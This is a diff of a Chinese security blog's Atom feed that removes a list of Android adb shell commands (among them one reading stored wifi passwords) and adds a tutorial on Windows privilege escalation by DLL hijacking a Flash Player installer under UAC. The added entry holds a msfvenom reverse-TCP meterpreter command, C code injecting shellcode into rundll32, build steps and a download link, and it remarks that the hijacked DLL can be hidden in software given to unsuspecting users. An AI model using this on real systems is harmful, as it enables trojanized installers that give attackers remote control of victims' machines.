@@ -1016,211 +1016,6 @@ iov[<span class="number">0x200</span>]-&gt;iov_len = ????????;
   </entry>
   
   <entry>
-    <title><![CDATA[adb shell常用命令]]></title>
-    <link href="http://blog.idhyt.com/2015/10/31/android-adb-shell-command/"/>
-    <id>http://blog.idhyt.com/2015/10/31/android-adb-shell-command/</id>
-    <published>2015-10-31T03:45:11.000Z</published>
-    <updated>2016-05-09T13:54:03.000Z</updated>
-    <content type="html"><![CDATA[<ul>
-<li><p>获取编译时间<br><code>cat /proc/version</code></p>
-</li>
-<li><p>内核崩溃<br><code>cat /proc/last_kmsg</code></p>
-</li>
-<li><p>获取硬件信息<br><code>adb shell getprop | grep cpu</code></p>
-</li>
-<li><p>获取序列号：<br><code>adb get-serialno</code></p>
-</li>
-<li><p>查看连接计算机的设备：<br><code>adb devices</code></p>
-</li>
-<li><p>查看模拟器/设施的当前状态:<br><code>adb get-state</code></p>
-</li>
-<li><p>多设备下连接目标设备：<br><code>adb -s xxx shell</code></p>
-</li>
-<li><p>重启机器：<br><code>adb reboot</code></p>
-</li>
-<li><p>重启到bootloader，即刷机模式：<br><code>adb reboot bootloader</code></p>
-</li>
-<li><p>重启到recovery，即恢复模式：<br><code>adb reboot recovery</code></p>
-</li>
-<li><p>查看log：<br><code>adb logcat</code></p>
-</li>
-<li><p>终止adb服务进程：<br><code>adb kill-server</code></p>
-</li>
-<li><p>重启adb服务进程：<br><code>adb start-server</code></p>
-</li>
-<li><p>查看Service列表<br><code>adb shell service list</code><br><code>adb shell dumpsys activity services</code></p>
-</li>
-</ul>
-<ul>
-<li><p>检查Service是否存在<br><code>adb shell service check phone</code></p>
-</li>
-<li><p>获取机器MAC地址：<br><code>adb shell  cat /sys/class/net/wlan0/address</code></p>
-</li>
-<li><p>获取CPU序列号：<br><code>adb shell cat /proc/cpuinfo</code></p>
-</li>
-<li><p>安装APK：<br><code>adb install &lt;apkfile&gt; //比如：adb install baidu.apk</code></p>
-</li>
-<li><p>保留数据和缓存文件，重新安装apk：<br><code>adb install -r &lt;apkfile&gt; //比如：adb install -r baidu.apk</code></p>
-</li>
-<li><p>安装apk到sd卡：<br><code>adb install -s &lt;apkfile&gt; // 比如：adb install -s baidu.apk</code></p>
-</li>
-<li><p>卸载APK：<br><code>adb uninstall &lt;package&gt; //比如：adb uninstall com.baidu.search</code></p>
-</li>
-<li><p>卸载app但保留数据和缓存文件：<br><code>adb uninstall -k &lt;package&gt; //比如：adb uninstall -k com.baidu.search</code></p>
-</li>
-<li><p>启动应用：<br><code>adb shell am start -n &lt;package_name&gt;/.&lt;activity_class_name&gt;</code></p>
-</li>
-<li><p>查看数据库：<br><code>adb shell content query --uri  content://settings/secure</code></p>
-</li>
-<li><p>查看设备cpu和内存占用情况：<br><code>adb shell top</code></p>
-</li>
-<li><p>查看占用内存前6的app：<br><code>adb shell top -m 6</code></p>
-</li>
-<li><p>刷新一次内存信息，然后返回：<br><code>adb shell top -n 1</code></p>
-</li>
-<li><p>查询各进程内存使用情况：<br><code>adb shell procrank</code></p>
-</li>
-<li><p>启动应用程序:<br><code>adb shell am</code></p>
-</li>
-<li><p>杀死一个进程：<br><code>adb shell kill [pid]</code></p>
-</li>
-<li><p>查看进程列表：<br><code>adb shell ps</code></p>
-</li>
-<li><p>查看Android系统的属性<br><code>adb shell prop</code></p>
-</li>
-<li><p>查看指定进程状态：<br><code>adb shell ps -x [PID]</code></p>
-</li>
-<li><p>查看后台services信息：<br><code>adb shell service list</code></p>
-</li>
-<li><p>adb 查看最上层成activity名字：</p>
-<blockquote>
-<p>linux:<br><code>adb shell dumpsys activity | grep &quot;mFocusedActivity&quot;</code><br>windows:<br><code>adb shell dumpsys activity | findstr &quot;mFocusedActivity&quot;</code></p>
-</blockquote>
-</li>
-<li><p>查看当前内存占用：<br><code>adb shell cat /proc/meminfo</code></p>
-</li>
-<li><p>查看IO内存分区：<br><code>adb shell cat /proc/iomem</code></p>
-</li>
-<li><p>将system分区重新挂载为可读写分区：<br><code>adb remount</code></p>
-</li>
-<li><p>从本地复制文件到设备：<br><code>adb push &lt;local&gt; &lt;remote&gt;</code></p>
-</li>
-<li><p>从设备复制文件到本地：<br><code>adb pull &lt;remote&gt; &lt;local&gt;</code></p>
-</li>
-<li><p>列出目录下的文件和文件夹，等同于dos中的dir命令：<br><code>adb shell ls</code></p>
-</li>
-<li><p>进入文件夹，等同于dos中的cd 命令：<br><code>adb shell cd &lt;folder&gt;</code></p>
-</li>
-<li><p>重命名文件：<br><code>adb shell rename path/oldfilename path/newfilename</code> </p>
-</li>
-<li><p>删除system/avi.apk：<br><code>adb shell rm /system/avi.apk</code></p>
-</li>
-<li><p>删除文件夹及其下面所有文件：<br><code>adb shell rm -r &lt;folder&gt;</code> </p>
-</li>
-<li><p>移动文件：<br><code>adb shell mv path/file newpath/file</code></p>
-</li>
-<li><p>设置文件权限：<br><code>adb shell chmod 777 /system/fonts/DroidSansFallback.ttf</code></p>
-</li>
-<li><p>新建文件夹：<br><code>adb shell mkdir path/foldelname</code></p>
-</li>
-<li><p>查看文件内容：<br><code>adb shell cat &lt;file&gt;</code> </p>
-</li>
-<li><p>查看wifi密码：<br><code>adb shell cat /data/misc/wifi/*.conf</code> </p>
-</li>
-<li><p>清除log缓存：<br><code>adb logcat -c</code></p>
-</li>
-<li><p>查看bug报告：<br><code>adb bugreport</code></p>
-</li>
-<li><p>获取设备名称：<br><code>adb shell cat /system/build.prop</code></p>
-</li>
-<li><p>查看ADB帮助：<br><code>adb help</code></p>
-</li>
-<li><p>跑monkey：<br><code>adb shell monkey -v -p your.package.name 500</code></p>
-</li>
-<li><p>dump堆栈：<br><code>debuggerd -b &lt;pid&gt;</code></p>
-</li>
-<li><p>备份与恢复:</p>
-<blockquote>
-<p>备份：<br><code>adb backup -f c:\allowBackup.ab -noapk com.ijinshan.browser_fast</code><br>恢复：<br><code>adb restore &quot;c:\allowBackup.ab&quot;</code></p>
-</blockquote>
-</li>
-<li><p>拷贝文件(这些命令都是在adb下用，而不是在shell中用):</p>
-<blockquote>
-<p>push从电脑端向手机复制文件:<br><code>adb push d:/adb/test.txt /data/data/download/</code><br>pull从手机端向本地复制文件:<br><code>adb pull /data/data/download/ d:/adb/</code></p>
-</blockquote>
-</li>
-<li><p>查看应用程序内存使用情况:<br><code>adb shell dumpsys meminfo &lt;package_name&gt;</code></p>
-<blockquote>
-<p>其中，package_name 也可以换成程序的pid,<br>pid可以通过 <code>adb shell top | grep app_name</code> 来查找.<br>内存使用情况参考<code>http://blog.csdn.net/bigconvience/article/details/35553983</code></p>
-</blockquote>
-</li>
-<li><p>查看进程占用cpu的情况:<br><code>adb shell top -n 1 -d 0.5 | grep proc_ id</code></p>
-</li>
-<li><p>procrank查看内存占用：<br><code>adb shell procrank</code></p>
-<blockquote>
-<p>VSS - Virtual Set Size 虚拟耗用内存（包含共享库占用的内存）<br>RSS - Resident Set Size 实际使用物理内存（包含共享库占用的内存）<br>PSS - Proportional Set Size 实际使用的物理内存（比例分配共享库占用的内存）<br>USS - Unique Set Size 进程独自占用的物理内存（不包含共享库占用的内存）</p>
-</blockquote>
-</li>
-</ul>
-<ul>
-<li><p>快速查看apk内androidmanifest文件内容:<br><code>aapt dump xmltree xxxx.apk AndroidManifest.xml</code></p>
-</li>
-<li><p>列出一些系统信息和所有应用的信息:<br><code>adb shell dumpsys packages &gt; d:\\packages.txt</code></p>
-</li>
-<li><p>列出一些指定应用的信息:<br><code>adb shell dumpsys package com.ijinshan.duba &gt; d:\\duba.txt</code></p>
-</li>
-<li><p>查看当前谁持有WAKE_LOCK锁对象：<br><code>adb shell dumpsys power</code></p>
-</li>
-<li><p>查看电池用量详情：<br><code>adb shell dumpsys batteryinfo</code></p>
-</li>
-<li><p>搜索文件：<br><code>busybox find -name *xxx*</code></p>
-</li>
-<li><p>电池日志：<br><code>adb shell dumpsys batterystats &gt; x:\batterystats.txt</code><br><code>bugreport日志：adb bugreport &gt; x:\bugreport.txt</code></p>
-</li>
-<li><p>电池日志图形界面查看<br><code>https://github.com/cacker/battery-historian</code></p>
-</li>
-<li><p>查看应用uid<br><code>cat /proc/&lt;pid&gt;/status</code><br><code>cat /data/system/packages.list | grep xxx</code></p>
-</li>
-<li><p>cpu频率<br>查看：<br><code>cat [%cpuFreqPath%]/cpuinfo_cur_freq (当前cpu频率)</code><br>修改：<br><code>echo xxx &gt; /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor</code></p>
-<blockquote>
-<p>cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_cur_freq   (当前cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq  (最大cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq  (最小cpu频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/related_cpus  (cpu数量标号,从0开始,如果是双核,结果为0,1)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies  (cpu所有可用频率)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors  (cpu所有可用调控模式)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor (当前使用哪种调控模式)<br>  cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_transition_latency (变频延迟)</p>
-</blockquote>
-</li>
-</ul>
-<ul>
-<li><p>某个应用内存消耗信息<br><code>adb shell dumpsys meminfo sina.mobile.tianqitong &gt; d:\\meminfo.txt</code></p>
-</li>
-<li><p>zygote的堆栈dump</p>
-<blockquote>
-<p>adb shell // 进入shell<br>chmod 777 /data/anr // /data/anr设置可读写权限<br>rm -r traces.txt // 删除原始traces<br>adb shell ps //查看进程pid<br>kill -3 <pid> //<br>adb pull /data/anr/traces.txt d:/trace.txt<br><strong>trace中查看cpu调度的基本信息</strong></pid></p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">"Thread-196" prio=5 tid=27 SUSPENDED</span><br><span class="line">| sysTid=2271 nice=0 sched=0/0 cgrp=apps/bg_non_interactive handle=1543812984</span><br><span class="line">| state=S schedstat=( 1177036142201 119659820902 234955 ) utm=84431 stm=33272 core=0</span><br><span class="line">#00  pc 000217a8  /system/lib/libc.so (__futex_syscall3+8)</span><br><span class="line">#01  pc 0000e09c  /system/lib/libc.so (__pthread_cond_timedwait_relative+48)</span><br><span class="line">#02  pc 0000e0f8  /system/lib/libc.so (__pthread_cond_timedwait+60)</span><br><span class="line">#03  pc 0005419d  /system/lib/libdvm.so (dvmChangeStatus(Thread*, ThreadStatus)+72)</span><br><span class="line">#04  pc 00049995  /system/lib/libdvm.so</span><br><span class="line">#05  pc 0004b9c1  /system/lib/libdvm.so</span><br><span class="line">#06  pc 0006e721  /system/lib/libandroid_runtime.so</span><br><span class="line">#07  pc 0001e610  /system/lib/libdvm.so (dvmPlatformInvoke+112)</span><br><span class="line">#08  pc 0004df29  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+500)</span><br><span class="line">#09  pc 00027a24  /system/lib/libdvm.so</span><br><span class="line">#10  pc 000fedc8  [stack:2271]</span><br><span class="line">at android.util.Log.println_native(Native Method)</span><br><span class="line">at android.util.Log.println(Log.java:332)</span><br><span class="line">at com.android.internal.os.AndroidPrintStream.log(AndroidPrintStream.java:47)</span><br><span class="line">at com.android.internal.os.LoggingPrintStream.println(LoggingPrintStream.java:311)</span><br><span class="line">at java.net.PlainSocketImpl.read(PlainSocketImpl.java:487)</span><br><span class="line">at java.net.PlainSocketImpl.access$000(PlainSocketImpl.java:46)</span><br><span class="line">at java.net.PlainSocketImpl$PlainSocketInputStream.read(PlainSocketImpl.java:240)</span><br><span class="line">at java.io.InputStream.read(InputStream.java:163)</span><br><span class="line">at java.io.BufferedInputStream.fillbuf(BufferedInputStream.java:142)</span><br><span class="line">at java.io.BufferedInputStream.read(BufferedInputStream.java:309)</span><br><span class="line">at com.sina.push.i.c.c(SourceFile:241)</span><br><span class="line">at com.sina.push.i.c.b(SourceFile:133)</span><br><span class="line">at com.sina.push.i.c.d(SourceFile:270)</span><br><span class="line">at com.sina.push.i.c.e(SourceFile:496)</span><br><span class="line">at com.sina.push.i.c.&lt;init&gt;(SourceFile:97)</span><br><span class="line">at com.sina.push.b.a.b.a(SourceFile:56)</span><br><span class="line">at com.sina.push.b.e.a(SourceFile:166)</span><br><span class="line">at com.sina.push.b.e$b$a.run(SourceFile:487)</span><br></pre></td></tr></table></figure>
-</blockquote>
-</li>
-</ul>
-<p>其中<code>schedstat=( 1177036142201 119659820902 234955 ) utm=84431 stm=33272 core=0</code><br>从左到右六个数字分别是:<br>1- 当前线程在cpu上消耗的时间<br>2- 当前任务在CPU任务轮询中的等待时间<br>3- 当前线程在这个cpu上运行的次数<br>4- 当前线程的用户态执行时间<br>5- 当前线程的内核态执行时间<br>6- 当前线程在哪里个核心上执行<br>实际上描述了调度的基本信息</p>
-<ul>
-<li>SYSTEM LOG<br><code>logcat -b system -v time -d *:v | grep sina.mobile</code><blockquote>
-<p>-b <buffer> // 加载一个可使用的日志缓冲区供查看，比如event和radio,默认值是main.<br>system // system log<br>-v // 输出字段 time 显示时间<br>-d // 缓冲区日志打印并退出<br>*:v // 日志级别高到低 E W I D V<br>grep sina.mobile // 过滤包含sina.mobile的信息</buffer></p>
-</blockquote>
-</li>
-</ul>
-]]></content>
-    <summary type="html">
-    <![CDATA[<ul>
-<li><p>获取编译时间<br><code>cat /proc/version</code></p>
-</li>
-<li><p>内核崩溃<br><code>cat /proc/last_kmsg</code></p>
-</li>
-<li><p>获取硬件信息<br><c]]>
-    </summary>
-    
-      <category term="adb" scheme="http://blog.idhyt.com/tags/adb/"/>
-    
-      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
-    
-  </entry>
-  
-  <entry>
     <title><![CDATA[安卓注入框架Xposed分析与简单应用]]></title>
     <link href="http://blog.idhyt.com/2015/09/25/android-injection-xposed/"/>
     <id>http://blog.idhyt.com/2015/09/25/android-injection-xposed/</id>
@@ -1299,6 +1094,66 @@ iov[<span class="number">0x200</span>]-&gt;iov_len = ????????;
       <category term="xposed" scheme="http://blog.idhyt.com/tags/xposed/"/>
     
       <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[借用UAC完成的提权思路]]></title>
+    <link href="http://blog.idhyt.com/2015/08/31/exploit-privilege-escalation-by-uac/"/>
+    <id>http://blog.idhyt.com/2015/08/31/exploit-privilege-escalation-by-uac/</id>
+    <published>2015-08-31T14:41:11.000Z</published>
+    <updated>2016-11-10T05:24:04.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="背景">背景</h2><p>UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。如果我们通过某种方式劫持了通过用户UAC验证的程序，那么相应的我们的程序也就实现了提权的过程。</p>
+<a id="more"></a>
+<h2 id="提权过程概述">提权过程概述</h2><p>首先我们找到目标程序，查找其动态加载的dll文件然后将其替换掉，插入我们包含shellcode的dll文件，这样用户在安装此文件的时候就会调用我们的dll文件，并执行我们的shellcode代码。同时为了防止程序崩掉导致我们的代码退出，采用注入的方式保证shellcode的稳定执行。在此过程中，如果目标程序请求UAC权限，对于用户来说这是一个正常的安装文件，一旦通过UAC验证，相应我们的shellcode也完成了提权过程。替换安装包dll文件这种行为太过于敏感，其实最后实现的方式是找到目标程序需要加载的，并且当前目录又不存在的需要联网下载的dll文件，我们只需要在该目录下放一个同名dll文件即可。</p>
+<h2 id="实验环境">实验环境</h2><ul>
+<li><p>Kali Debian7<br>Kali集成Metasploit等漏洞利用工具，方便提取shellcode和反弹TCP连接。最好安装一个Mingw-w64用于编译c代码。</p>
+</li>
+<li><p>windows7 x64<br>主要的目标测试环境。</p>
+</li>
+<li><p>Procmon.exe<br>Procmon是微软出的一款强大的Windows监视工具，不但可以监视进程/线程，还可以监控到文件系统，注册表的变化等。</p>
+</li>
+<li><p>install_flashplayer15x32_mssd_aaa_aih<br>这里我们以flashplayer安装文件作为目标文件，版本为15x32_mssd_aaa_aih，可自行下载，或者从最后的打包附件中找到。</p>
+</li>
+</ul>
+<h2 id="详细提权过程">详细提权过程</h2><h3 id="查找可劫持的dll文件">查找可劫持的dll文件</h3><p>首先我们在win7系统下先打开procmon监控软件，清除一下日志信息，然后运行我们的目标文件install_flashplayer15x32_mssd_aaa_aih，运行过后会弹出UAC选项，需要用户确认授权。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-1.jpg" alt=""></p>
+<p>这里我们点“是”，然后安装包开始安装并自删除，并从服务器下载所需的文件，这时候就可以关掉了，因为我们只需要看该软件包都加载了哪些dll文件。</p>
+<p>看下Procmon.exe记录所有行为<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-2.jpg" alt=""></p>
+<p>信息量太大，我们需要过滤出有用的信息。</p>
+<p>首先是只看我们目标进程的信息，添加过滤规则：</p>
+<pre><code><span class="keyword">Process</span> Name <span class="keyword">is</span> install_flashplayer15x32_mssd_aaa_aih
+</code></pre><p>然后是过滤掉加载系统的dll文件，只看安装包当前目录下加载的dll文件，我这里安装包存放在dllhijack文件夹下，添加过滤规则：</p>
+<pre><code>Path <span class="keyword">contains</span> dllhijack
+</code></pre><p>并且该加载dll不存在，需要联网从服务器下载，最后再添加一个过滤规则：</p>
+<pre><code><span class="keyword">Result</span> <span class="keyword">is</span> NAME <span class="keyword">NOT</span> FOUND
+</code></pre><p>三个过滤规则如下所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-3.jpg" alt=""></p>
+<p>经过三个规则过滤后，留下的信息就很明显了，如下图所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-4.jpg" alt=""></p>
+<p>上边所列的dll文件都是会尝试加载，并且找不到，会联网进行下载的dll文件，因此，我们的目标就是劫持这些dll文件，也不需要替换，直接将我们的dll文件放在安装包同目录即可，这也是为什么选择这个安装程序测试的原因。如果选择其他安装包测试的，最好也是选择这种联网安装类型的，所有文件都从服务器拉取，如果安装程序没有对这些从服务器拉取的文件进行效验，就能够被劫持。</p>
+<h3 id="编写exploit">编写exploit</h3><p>找到劫持了dll文件后，我们进入Debian系统用msf生成shellcode，这里我们选择反弹tcp的shellcode，需要知道服务器ip地址和监听端口，这里也选择Debian系统作为服务器，ifconfig查看下ip，设置监听端口为9000，最后执行如下命令生成shellcode:</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.127</span><span class="number">.133</span> LPORT=<span class="number">9000</span> -f c
+</code></pre><p><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-5.jpg" alt=""></p>
+<p>为了防止程序挂掉或者退出导致shellcode也跟着退出，采用注入的方式，将shellcode注入rundll32.exe进程，然后连接远程端口。服务器监听该端口，一旦有请求就建立会话连接，注入关键代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (CreateProcess(<span class="number">0</span>, <span class="string">"rundll32.exe"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, CREATE_SUSPENDED | IDLE_PRIORITY_CLASS, <span class="number">0</span>, <span class="number">0</span>, &amp;si, &amp;pi)) &#123;</span><br><span class="line">	ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;</span><br><span class="line">	GetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">	ep = (LPVOID)VirtualAllocEx(pi.hProcess, <span class="literal">NULL</span>, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	WriteProcessMemory(pi.hProcess, (PVOID)ep, &amp;code, SCSIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="preprocessor">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">			ctx.Rip = (DWORD64)ep;</span><br><span class="line">	<span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">			ctx.Eip = (DWORD)ep;</span><br><span class="line">	<span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	SetThreadContext(pi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">	ResumeThread(pi.hThread);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后将程序编译，这里编译直接在Debian系统下用Mingw-w64编译，命令入下：</p>
+<pre><code>root<span class="variable">@idhyt</span><span class="symbol">:~/maldemo</span><span class="comment"># i686-w64-mingw32-gcc template.c -o template.dll –shared</span>
+root<span class="variable">@idhyt</span><span class="symbol">:~/maldemo</span><span class="comment"># file template.dll</span>
+template.<span class="symbol">dll:</span> <span class="constant">PE32</span> executable (<span class="constant">DLL</span>) (console) <span class="constant">Intel</span> <span class="number">80386</span>, <span class="keyword">for</span> <span class="constant">MS</span> <span class="constant">Windows</span>
+</code></pre><p>将编译好的template.dll拷贝到win7系统中备用。<br>debian系统设置服务器并监听9000端口，所有命令如下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-6.jpg" alt=""></p>
+<h3 id="提权">提权</h3><p>将编译的template.dll文件放在install_flashplayer15x32_mssd_aaa_aih目录下，从我们监控到的可劫持dll文件中选择一个，这里我选择dhcpcsv6.dll。将我们的dll文件改名为dhcpcsvc6.dll，其他dll文件可自行尝试。之后重新运行安装包，弹出UAC选项后点“是”。</p>
+<p>之后我们在debian系统的服务端会看到我们已经监听到了这个端口，看下会话信息：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-7.jpg" alt=""></p>
+<p>查看下当前uid，然后执行getsystem命令权限：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-8.jpg" alt=""></p>
+<p>可以看到已经提权成功，然后进入shell查看下文件，运行个计算器什么的。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-privilege-escalation-by-uac-9.jpg" alt=""></p>
+<h2 id="总结">总结</h2><p>UAC很大程度上减少PC受到恶意软件侵害的机会，但是并不表明是不可被利用的。通过这种dll劫持方式，可以将dll文件设置为隐藏，并将正常的软件(如adobe flash player)打包给用户，用户基本是察觉不到的，一旦用户正常安装，机器就会被攻击者控制。一些病毒通过劫持lpk.dll等系统dll文件造成的病毒体执行，也是利用这种思路。</p>
+<p>代码和安装包上传<a href="http://pan.baidu.com/s/1ntAbfQD" target="_blank" rel="external">百度网盘</a>，<br>密码: rmsq 解压码：ks123456</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="背景">背景</h2><p>UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。如果我们通过某种方式劫持了通过用户UAC验证的程序，那么相应的我们的程序也就实现了提权的过程。</p>]]>
+    
+    </summary>
+    
+      <category term="uac" scheme="http://blog.idhyt.com/tags/uac/"/>
+    
+      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
     
   </entry>
   
